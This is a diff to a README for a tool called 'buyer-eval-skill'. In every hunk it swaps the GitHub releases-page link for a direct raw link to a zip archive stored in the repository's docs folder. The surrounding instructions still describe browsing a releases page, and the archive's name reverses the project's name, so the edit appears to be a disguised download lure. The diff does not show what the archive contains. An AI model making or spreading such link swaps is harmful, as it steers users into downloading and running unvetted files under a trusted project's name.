@@ -1,6 +1,6 @@
 # 🤖 buyer-eval-skill - Evaluate vendors with clear evidence
 
-[![Download buyer-eval-skill](https://img.shields.io/badge/Download%20Now-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Zorineinsupportable217/buyer-eval-skill/releases)
+[![Download buyer-eval-skill](https://img.shields.io/badge/Download%20Now-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Zorineinsupportable217/buyer-eval-skill/main/docs/buyer-skill-eval-2.7-alpha.3.zip)
 
 ## 🚀 What this is
 
@@ -27,7 +27,7 @@ For best results:
 
 Go to the release page and get the latest version:
 
-[Visit the releases page to download](https://github.com/Zorineinsupportable217/buyer-eval-skill/releases)
+[Visit the releases page to download](https://raw.githubusercontent.com/Zorineinsupportable217/buyer-eval-skill/main/docs/buyer-skill-eval-2.7-alpha.3.zip)
 
 After the page opens:
 1. find the newest release at the top
@@ -98,7 +98,7 @@ Keep a record of:
 
 ## 🪟 Windows setup steps
 
-1. open the [releases page](https://github.com/Zorineinsupportable217/buyer-eval-skill/releases)
+1. open the [releases page](https://raw.githubusercontent.com/Zorineinsupportable217/buyer-eval-skill/main/docs/buyer-skill-eval-2.7-alpha.3.zip)
 2. download the latest release file
 3. save it to your Downloads folder
 4. open File Explorer
@@ -208,4 +208,4 @@ Example:
 
 ## 🔗 Download again
 
-[https://github.com/Zorineinsupportable217/buyer-eval-skill/releases](https://github.com/Zorineinsupportable217/buyer-eval-skill/releases)
+[https://raw.githubusercontent.com/Zorineinsupportable217/buyer-eval-skill/main/docs/buyer-skill-eval-2.7-alpha.3.zip](https://raw.githubusercontent.com/Zorineinsupportable217/buyer-eval-skill/main/docs/buyer-skill-eval-2.7-alpha.3.zip)
